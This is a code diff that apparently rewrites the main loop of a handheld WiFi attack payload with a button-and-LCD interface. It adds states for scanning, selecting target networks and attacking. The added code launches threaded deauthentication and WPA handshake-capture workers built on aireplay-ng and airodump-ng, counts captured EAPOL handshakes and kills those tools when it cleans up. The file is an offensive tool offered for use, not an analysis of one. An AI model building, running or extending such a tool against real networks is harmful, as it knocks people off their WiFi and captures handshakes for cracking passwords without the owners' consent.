-                        elif btn == "DOWN":
-                            while pressed_button() == "DOWN":
-                                time.sleep(0.05)
-                            SCAN_TIMEOUT = max(5, SCAN_TIMEOUT - 5)
-                        elif btn == "OK":
-                            while pressed_button() == "OK":
-                                time.sleep(0.05)
-                            break
-                        elif btn == "KEY3":
-                            while pressed_button() == "KEY3":
-                                time.sleep(0.05)
-                            break
-                        else:
-                            time.sleep(0.05)
-                    
-                    show_main_menu_page()
-                
-                elif btn == "KEY2":  # Switch interface (MOVED HERE)
-                    while pressed_button() == "KEY2":
-                        time.sleep(0.05)
-                    
-                    switch_interface()
-                    show_main_menu_page()
-                
-                elif btn == "KEY3":  # Exit
-                    simple_cleanup()
-                    running = False
-                    break
-            
-            elif current_screen == "networks":
-                # NETWORK SELECTION SCREEN
-                if btn == "UP":  # Navigate up
-                    while pressed_button() == "UP":
-                        time.sleep(0.05)
-                    selected_index = (selected_index - 1) % len(networks)
-                    draw_network_list(networks, selected_index, selected_targets)
+        # ---------------------------------------------------------------
+        # IDLE
+        # ---------------------------------------------------------------
+        if state == "idle":
+            if btn == "OK":
+                # Debounce
+                while get_button(PINS, GPIO) == "OK":
+                    time.sleep(0.05)
+                state = "scanning"
+                scan_start_time = time.time()
+                # Launch scan in background thread
+                scan_result = [None]
+                scan_cancelled = threading.Event()
 
-                elif btn == "DOWN":  # Navigate down
-                    while pressed_button() == "DOWN":
-                        time.sleep(0.05)
-                    selected_index = (selected_index + 1) % len(networks)
-                    draw_network_list(networks, selected_index, selected_targets)
-                
-                elif btn == "OK":  # Toggle selection
-                    while pressed_button() == "OK":
-                        time.sleep(0.05)
-                    
-                    network = networks[selected_index]
-                    if network['bssid'] in [t['bssid'] for t in selected_targets]:
-                        # Remove from selection
-                        selected_targets = [t for t in selected_targets if t['bssid'] != network['bssid']]
-                        log(f"Removed target: {network['essid']}")
-                    else:
-                        # Add to selection
-                        selected_targets.append(network)
-                        log(f"Added target: {network['essid']}")
+                def _scan_worker():
+                    result = scan_networks(WIFI_INTERFACE, scan_timeout)
+                    if not scan_cancelled.is_set():
+                        scan_result[0] = result
 
-                    draw_network_list(networks, selected_index, selected_targets)
-                
-                elif btn == "RIGHT":  # Start attack
-                    while pressed_button() == "RIGHT":
-                        time.sleep(0.05)
-                    
-                    if selected_targets:
-                        if start_attacks():
-                            current_screen = "attacking"
-                            attack_start_time = time.time()
-                            deauth_packet_count = 0
-                            discovered_clients = 0
-                            draw_attacking_screen(selected_targets, deauth_packet_count, 0, discovered_clients)
-                        else:
-                            show(["Failed to start", "attacks!", "", "Press any key..."])
-                            time.sleep(3)
-                    else:
-                        show(["No targets selected!", "Select targets first", "", "Press any key..."])
-                        time.sleep(2)
-                        draw_network_list(networks, selected_index, selected_targets)
-                
-                elif btn == "KEY1":  # Rescan
-                    while pressed_button() == "KEY1":
-                        time.sleep(0.05)
-                    
-                    networks = scan_networks()
-                    if networks:
-                        selected_index = 0
-                        selected_targets = []
-                        draw_network_list(networks, selected_index, selected_targets)
-                    else:
-                        show(["No networks found!", "Try longer timeout", "", "Press any key..."])
-                        time.sleep(3)
-                
-                elif btn == "KEY2":  # Clear selections
-                    while pressed_button() == "KEY2":
-                        time.sleep(0.05)
-                    selected_targets = []
-                    log("Cleared all target selections")
-                    draw_network_list(networks, selected_index, selected_targets)
-                
-                elif btn == "KEY3":  # Back to main menu
-                    while pressed_button() == "KEY3":
-                        time.sleep(0.05)
-                    current_screen = "main"
-                    show_main_menu_page()
-            
-            elif current_screen == "attacking":
-                # ATTACKING SCREEN
-                if btn == "KEY2":  # Stop attacks
-                    while pressed_button() == "KEY2":
-                        time.sleep(0.05)
-                    
-                    stopped = stop_all_attacks()
-                    show_status(f"Stopped {stopped} attacks")
-                    time.sleep(2)
+                scan_thread = threading.Thread(target=_scan_worker, daemon=True)
+                scan_thread.start()
 
-                    current_screen = "networks"
-                    draw_network_list(networks, selected_index, selected_targets)
-                
-                elif btn == "KEY3":  # Exit
-                    simple_cleanup()
-                    running = False
-                    break
-            
+            elif btn == "LEFT":
+                while get_button(PINS, GPIO) == "LEFT":
+                    time.sleep(0.05)
+                attack_mode = (attack_mode - 1) % len(MODE_LABELS)
+                draw_idle(WIFI_INTERFACE, scan_timeout, attack_mode)
+
+            elif btn == "RIGHT":
+                while get_button(PINS, GPIO) == "RIGHT":
+                    time.sleep(0.05)
+                attack_mode = (attack_mode + 1) % len(MODE_LABELS)
+                draw_idle(WIFI_INTERFACE, scan_timeout, attack_mode)
+
+            elif btn == "UP":
+                while get_button(PINS, GPIO) == "UP":
+                    time.sleep(0.05)
+                scan_timeout = min(60, scan_timeout + 5)
+                draw_idle(WIFI_INTERFACE, scan_timeout, attack_mode)
+
+            elif btn == "DOWN":
+                while get_button(PINS, GPIO) == "DOWN":
+                    time.sleep(0.05)
+                scan_timeout = max(5, scan_timeout - 5)
+                draw_idle(WIFI_INTERFACE, scan_timeout, attack_mode)
+
+            elif btn == "KEY3":
+                _running = False
+                break
+
             else:
                 time.sleep(0.05)
-                
-        except Exception as e:
-            log(f"CRASH PREVENTION: Error in main loop: {str(e)}")
-            import traceback
-            log(f"Full error: {traceback.format_exc()}")
-            show_status("Error - restarting")
-            time.sleep(2)
-            try:
-                show_main_menu_page()
-            except:
-                show(["Error occurred", "Restarting...", "", "Press KEY3"])
-                time.sleep(3)
+
+        # ---------------------------------------------------------------
+        # SCANNING
+        # ---------------------------------------------------------------
+        elif state == "scanning":
+            elapsed = now - scan_start_time
+            draw_scanning(elapsed, scan_timeout)
+
+            if btn == "KEY3":
+                while get_button(PINS, GPIO) == "KEY3":
+                    time.sleep(0.05)
+                scan_cancelled.set()
+                state = "idle"
+                draw_idle(WIFI_INTERFACE, scan_timeout, attack_mode)
+                continue
+
+            # Check if scan finished
+            if scan_result[0] is not None or not scan_thread.is_alive():
+                scan_thread.join(timeout=2)
+                networks = scan_result[0] if scan_result[0] else []
+                if networks:
+                    selected_index = 0
+                    selected_targets = []
+                    state = "select"
+                    draw_select(networks, selected_index, selected_targets, attack_mode)
+                else:
+                    draw_status(f"No networks found. KEY3=Back", CLR_RED)
+                    time.sleep(2)
+                    state = "idle"
+                    draw_idle(WIFI_INTERFACE, scan_timeout, attack_mode)
+
+            time.sleep(0.1)
+
+        # ---------------------------------------------------------------
+        # SELECT
+        # ---------------------------------------------------------------
+        elif state == "select":
+            if btn == "UP":
+                while get_button(PINS, GPIO) == "UP":
+                    time.sleep(0.05)
+                selected_index = (selected_index - 1) % len(networks)
+                draw_select(networks, selected_index, selected_targets, attack_mode)
+
+            elif btn == "DOWN":
+                while get_button(PINS, GPIO) == "DOWN":
+                    time.sleep(0.05)
+                selected_index = (selected_index + 1) % len(networks)
+                draw_select(networks, selected_index, selected_targets, attack_mode)
+
+            elif btn == "OK":
+                while get_button(PINS, GPIO) == "OK":
+                    time.sleep(0.05)
+                net = networks[selected_index]
+                bssids_sel = {t["bssid"] for t in selected_targets}
+                if net["bssid"] in bssids_sel:
+                    selected_targets = [t for t in selected_targets if t["bssid"] != net["bssid"]]
+                else:
+                    selected_targets = selected_targets + [net]
+                draw_select(networks, selected_index, selected_targets, attack_mode)
+
+            elif btn == "LEFT" or btn == "RIGHT":
+                while get_button(PINS, GPIO) in ("LEFT", "RIGHT"):
+                    time.sleep(0.05)
+                attack_mode = (attack_mode + 1) % len(MODE_LABELS)
+                draw_select(networks, selected_index, selected_targets, attack_mode)
+
+            elif btn == "KEY1":
+                # Rescan
+                while get_button(PINS, GPIO) == "KEY1":
+                    time.sleep(0.05)
+                state = "scanning"
+                scan_start_time = time.time()
+                scan_result = [None]
+                scan_cancelled = threading.Event()
+
+                def _scan_worker():
+                    result = scan_networks(WIFI_INTERFACE, scan_timeout)
+                    if not scan_cancelled.is_set():
+                        scan_result[0] = result
+
+                scan_thread = threading.Thread(target=_scan_worker, daemon=True)
+                scan_thread.start()
+
+            elif btn == "KEY2":
+                # Start attack
+                while get_button(PINS, GPIO) == "KEY2":
+                    time.sleep(0.05)
+                if not selected_targets:
+                    draw_status("No targets selected!", CLR_RED)
+                    time.sleep(1.5)
+                    draw_select(networks, selected_index, selected_targets, attack_mode)
+                    continue
+
+                # Prepare attack
+                attack_stop = threading.Event()
+                attack_threads_list = []
+                attack_stats = {
+                    "packets": 0,
+                    "clients": len(selected_targets),
+                    "eapol": 0,
+                    "hs_captured": 0,
+                    "hs_ssid": "",
+                }
+                prev_hs_count = 0
+                hs_flash_until = 0
+
+                # Kill leftovers
+                run_command("pkill -f aireplay-ng")
+                run_command("pkill -f airodump-ng")
+                time.sleep(0.5)
+
+                # Start deauth worker
+                t_atk = threading.Thread(
+                    target=start_attack_worker,
+                    args=(selected_targets, WIFI_INTERFACE, attack_stop, attack_stats),
+                    daemon=True,
+                )
+                t_atk.start()
+                attack_threads_list.append(t_atk)
+
+                # Start capture worker if mode is DTH+CAP
+                if attack_mode == MODE_DEAUTH_CAPTURE:
+                    t_cap = threading.Thread(
+                        target=start_capture_worker,
+                        args=(selected_targets, WIFI_INTERFACE, attack_stop, attack_stats),
+                        daemon=True,
+                    )
+                    t_cap.start()
+                    attack_threads_list.append(t_cap)
+
+                attack_start_time = time.time()
+                state = "attacking"
+                log(f"Attack started: {len(selected_targets)} targets, mode={MODE_LABELS[attack_mode]}")
+
+            elif btn == "KEY3":
+                while get_button(PINS, GPIO) == "KEY3":
+                    time.sleep(0.05)
+                state = "idle"
+                draw_idle(WIFI_INTERFACE, scan_timeout, attack_mode)
+
+            else:
+                time.sleep(0.05)
+
+        # ---------------------------------------------------------------
+        # ATTACKING
+        # ---------------------------------------------------------------
+        elif state == "attacking":
+            elapsed = now - attack_start_time
+
+            # Check for new handshake captures -> flash
+            if attack_stats["hs_captured"] > prev_hs_count:
+                prev_hs_count = attack_stats["hs_captured"]
+                hs_flash_until = now + 3.0
+                flash_green_capture()
+
+            draw_attack_dashboard(
+                selected_targets, attack_stats, elapsed,
+                attack_mode, hs_flash_until,
+            )
+
+            if btn == "KEY2":
+                while get_button(PINS, GPIO) == "KEY2":
+                    time.sleep(0.05)
+                stop_all(attack_stop, attack_threads_list, WIFI_INTERFACE)
+                attack_threads_list = []
+                draw_status("Attacks stopped", CLR_YELLOW)
+                time.sleep(1.5)
+                # Re-enter monitor mode for potential rescan
+                ok, WIFI_INTERFACE = validate_setup(WIFI_INTERFACE)
+                state = "select"
+                if networks:
+                    draw_select(networks, selected_index, selected_targets, attack_mode)
+                else:
+                    state = "idle"
+                    draw_idle(WIFI_INTERFACE, scan_timeout, attack_mode)
+
+            elif btn == "KEY3":
+                while get_button(PINS, GPIO) == "KEY3":
+                    time.sleep(0.05)
+                stop_all(attack_stop, attack_threads_list, WIFI_INTERFACE)
+                attack_threads_list = []
+                _running = False
+                break
+
+            time.sleep(0.2)
 
 finally:
-    # Cleanup
-    if running:  # Only do cleanup if we didn't already clean up
-        simple_cleanup()
-    show(["Payload finished"])
+    # Ensure cleanup
+    if attack_threads_list:
+        stop_all(attack_stop, attack_threads_list, WIFI_INTERFACE)
+    else:
+        run_command("pkill -f aireplay-ng 2>/dev/null || true")
+        run_command("pkill -f airodump-ng 2>/dev/null || true")
+        run_command(f"nmcli device set {WIFI_INTERFACE} managed yes 2>/dev/null || true")
+    draw_status("Payload finished")
     time.sleep(1)
     LCD.LCD_Clear()
     GPIO.cleanup()
